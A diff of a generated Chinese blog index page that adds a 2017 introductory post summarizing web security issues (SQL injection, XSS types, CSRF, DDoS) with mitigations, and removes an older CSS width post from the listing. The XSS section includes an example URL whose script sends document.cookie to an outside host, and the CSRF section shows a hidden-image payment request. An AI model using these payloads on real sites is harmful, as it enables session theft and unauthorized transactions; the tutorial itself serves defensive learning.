@@ -273,6 +273,192 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://iamzay.github.io/2017/09/21/Web安全问题总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Zay">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是郑安源">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/21/Web安全问题总结/" itemprop="url">Web安全问题总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T01:25:54+08:00">
+                2017-09-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index">
+                    <span itemprop="name">Web</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/09/21/Web安全问题总结/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/09/21/Web安全问题总结/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="资源枚举"><a href="#资源枚举" class="headerlink" title="资源枚举"></a>资源枚举</h1><p>遍历站点可访问的文件夹，枚举可能存在的文件名，这样有可能下载到重要文件。<br>措施:不要将重要文件放到公众可访问到的地方</p>
+<h1 id="参数操纵"><a href="#参数操纵" class="headerlink" title="参数操纵"></a>参数操纵</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>提交含有SQL操作语句的信息给后端，比如一本书的详情url是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">book.com/book?id=100</div></pre></td></tr></table></figure></p>
+<p>这意味着这本书在数据库中的id为100，后端可能直接将这个id取出来，使用下面的语句查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from booktable where id=100</div></pre></td></tr></table></figure></p>
+<p>如果把url更改为<code>book.com/book?id=100or1=1</code>，且此时后端没有进行防护，则查询语句会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from booktable where id=100 or 1=1</div></pre></td></tr></table></figure></p>
+<p>措施：</p>
+<ul>
+<li>验证用户的输入</li>
+<li>对用户提供的所有输入进行编码</li>
+<li>使用语言自带的存储程序，而不是自己操纵数据库</li>
+</ul>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS的特点是想尽一切办法在目标网站上执行第三方脚本。</p>
+<h3 id="基于反射的XSS"><a href="#基于反射的XSS" class="headerlink" title="基于反射的XSS"></a>基于反射的XSS</h3><p>有时用户会在页面上输入一些信息，且JS可能会将输入的信息重新展示一遍，如果不对输入进行过滤，那么当恶意用户输入的内容是一段包含script标签的脚本时，浏览器就会执行这段脚本。比如，通过QQ群等群发下面的链接就能获取用户的cookie:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">book.com/search?name=&lt;script&gt;document.location=&apos;http://vajoy/get?cookie=&apos;+document.cookie&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>这是基于反射的XSS，由服务器返回脚本，客户端执行。</p>
+<h3 id="基于DOM或本地的XSS"><a href="#基于DOM或本地的XSS" class="headerlink" title="基于DOM或本地的XSS"></a>基于DOM或本地的XSS</h3><p>比如通过为用户提供免费的WiFi，但提供WiFi的网关会往用户访问的任何页面中插入脚本，像这种无需服务器返回脚本直接跨域发送用户信息的行为就是本地XSS攻击。</p>
+<h3 id="基于存储的XSS"><a href="#基于存储的XSS" class="headerlink" title="基于存储的XSS"></a>基于存储的XSS</h3><p>网站一般都会将用户发表的内容，如留言、评论等保存在数据库中，这样等用户下次访问网页还能看到。通过XSS攻击将恶意脚本保存到服务器数据库中，这样之后访问这些发表内容的用户都会遭到攻击。</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨域请求伪造。假设一个网站只要用户登录后没关闭浏览器，用户在任何情况下都可以免去身份验证而进行所有操作。这样如果此时给用户发送邮件，且其中有一个图片的src是<code>&lt;img src=&#39;http://book.com/pay?bookid=100&#39;/&gt;</code>，那么通过src的请求，用户在不知情的情况下完成了支付的操作。防护CSRF可进行下面这些措施：</p>
+<ul>
+<li>检查报文头中的Referer参数确保请求发自正确的网站</li>
+<li>对于任何重要的请求都重新验证用户的身份</li>
+<li>创建一个唯一的token，将其存在服务端的session和客户端的cookie中，对任何请求都检查二者是否一致。</li>
+</ul>
+<h1 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h1><p>通过大量占用服务器带宽和计算资源以达到瘫痪对方网络的目的。</p>
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ul>
+<li>对用户的输入进行编码和过滤</li>
+<li>谨慎地返回用户输入的信息</li>
+<li>检查、验证请求源，对每一个重要的操作都重新验证</li>
+<li>设置http header: “X-XSS-Protection:1”</li>
+</ul>
+<h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><ul>
+<li><a href="http://www.cnblogs.com/vajoy/p/4176908.html" target="_blank" rel="external">http://www.cnblogs.com/vajoy/p/4176908.html</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://iamzay.github.io/2017/09/20/前端跨域问题总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1700,174 +1886,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://iamzay.github.io/2017/07/23/CSS中的宽度/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Zay">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="我是郑安源">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/07/23/CSS中的宽度/" itemprop="url">CSS中的宽度</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-23T13:58:25+08:00">
-                2017-07-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/" itemprop="url" rel="index">
-                    <span itemprop="name">Web</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/CSS/" itemprop="url" rel="index">
-                    <span itemprop="name">CSS</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/07/23/CSS中的宽度/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/07/23/CSS中的宽度/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="max-width"><a href="#max-width" class="headerlink" title="max-width"></a>max-width</h1><ul>
-<li>max-width overrides width, but min-width overrides max-width.</li>
-<li>In this example, the “child” will be either 150 pixels wide or the width of the “parent,” whichever is smaller::<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"parent"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"child"</span>&gt;</span></div><div class="line">    Fusce pulvinar vestibulum eros, sed luctus ex lobortis quis.</div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
-</li>
-</ul>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#parent</span> &#123;</div><div class="line">  <span class="attribute">background</span>: lightblue;</div><div class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</div><div class="line">&#125;</div><div class="line"><span class="selector-id">#child</span> &#123;</div><div class="line">  <span class="attribute">background</span>: gold;</div><div class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">max-width</span>: <span class="number">150px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<ul>
-<li><p>The fit-content value can be used to set the width of an element based on the intrinsic size required by its content:</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#parent</span> &#123;</div><div class="line">  <span class="attribute">background</span>: lightblue;</div><div class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</div><div class="line">&#125;</div><div class="line"><span class="selector-id">#child</span>  &#123;</div><div class="line">  <span class="attribute">background</span>: gold;</div><div class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">max-width</span>: -moz-fit-content;</div><div class="line">  <span class="attribute">max-width</span>: -webkit-fit-content;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-</li>
-<li><p>max-width有个好处，当包含块的宽度小于子元素的max-width时，子元素的实际宽度会调整成包含块的宽度，这样不会overflow:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></div><div class="line">        <span class="selector-class">.container</span>&#123;</div><div class="line">            <span class="attribute">width</span>: <span class="number">100px</span>;</div><div class="line">            <span class="attribute">border</span>: <span class="number">1px</span> solid tomato;</div><div class="line">            <span class="attribute">height</span>: <span class="number">100px</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="selector-class">.fixedWidth</span>&#123;</div><div class="line">            <span class="attribute">border</span>: <span class="number">1px</span> solid silver;</div><div class="line">            <span class="attribute">width</span>: <span class="number">200px</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="selector-class">.flexibleWidth</span>&#123;</div><div class="line">            <span class="attribute">max-width</span>: <span class="number">200px</span>;</div><div class="line">            <span class="attribute">border</span>:<span class="number">1px</span> solid lightblue;</div><div class="line">        &#125;</div><div class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fixedWidth"</span>&gt;</span>fuckfuckfuck<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"flexibleWidth"</span>&gt;</span>fuckfuckfuck<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1917,7 +1935,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">52</span>
+                <span class="site-state-item-count">53</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1928,7 +1946,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-count">23</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1939,7 +1957,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-count">28</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
